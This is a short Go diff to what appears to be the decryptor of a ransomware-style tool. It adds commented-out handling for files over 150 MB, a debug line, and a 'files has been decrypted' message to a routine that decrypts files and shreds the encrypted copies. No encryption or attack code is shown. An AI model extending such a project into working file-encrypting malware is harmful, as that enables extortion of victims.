@@ -282,10 +282,21 @@ func decodeBase64(b []byte) []byte {
 	}
 	return data
 }
-
+var MB150 int = 157286400
 func decrypt(key, text []byte) []byte {
 	block, err := aes.NewCipher(key)
 	Error(err)
+	//var above bool = false // edode : if file size is above 950 MB
+	//var not_ciphered_text []byte
+	//
+	//if err != nil {
+	//	panic(err)
+	//}
+	//if len(text) > MB150 { // edode : if the size of the file is superior to 150MB
+	//	text	     	  = text[:MB150]
+	//	not_ciphered_text = text[MB150:]
+	//	above = true
+	//}
 	if len(text) < aes.BlockSize {
 		fmt.Printf("Error!\n")
 		os.Exit(0)
@@ -359,6 +370,7 @@ func tree(path string)(){
 	shredconf := Conf{Times: 1, Zeros: false, Remove: true}
 	start := time.Now()
 	for _, file := range file_list {
+		//fmt.Printf(file)
 		if is_dir(file){
 			file_list = remove_to_index(file_list, 1)
 			continue
@@ -372,6 +384,7 @@ func tree(path string)(){
 		file_list = remove_to_index(file_list, 1)
 	}
 	elapsed := time.Since(start)
+	fmt.Println("All of your files has been decrypted")
 	log.Printf("SECOND ELAPSED : %s", elapsed)
 }
 
